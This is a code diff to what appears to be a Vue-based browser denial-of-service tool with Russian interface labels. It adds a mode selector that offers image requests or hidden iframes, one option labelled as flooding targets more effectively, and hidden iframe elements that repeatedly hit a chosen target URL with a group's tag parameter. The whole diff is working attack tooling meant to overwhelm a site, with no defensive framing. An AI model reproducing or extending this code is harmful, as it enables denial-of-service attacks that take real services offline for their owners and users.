@@ -17,10 +17,17 @@
           <div class="requestsPerPass">
             <label>Запросов за проход: <input type="number" v-model.number="requestsPerPass"></label>
           </div>
+          <div>
+            <select v-model='mode'>
+              <option value='img'>Image (лайтовая хуйня)</option>
+              <option value='iframe'>Iframe (пежже дудосит)</option>
+            </select>
+          </div>
           <button v-if='!started' v-on:click="start()">Старт</button>
           <button v-else v-on:click="stop()">Стоп</button>
         </div>
-        <img class="hidden" v-for='addr in addrs' :src="point + '?PVD_RULEZZZ=' + addr + '&weAre=https://pvd.thirdwave.tk/'" :alt="addr" :title="addr">
+        <img class="hidden" v-if='mode == "img"' v-for='addr in addrs' :src="point + '?PVD_RULEZZZ=' + addr + '&weAre=https://pvd.thirdwave.tk/'" :alt="addr" :title="addr">
+        <iframe class="hidden" v-if="mode == 'iframe'" v-for='addr in addrs' :src="point + '?PVD_RULEZZZ=' + addr + '&weAre=https://pvd.thirdwave.tk/'"></iframe>
       </div>
     </div>
     <Chat></Chat>
@@ -39,7 +46,8 @@
         started: false,
         interval: 500,
         addrs: [],
-        requestsPerPass: 1
+        requestsPerPass: 1,
+        mode: 'img'
       }
     },
     components: { Chat },
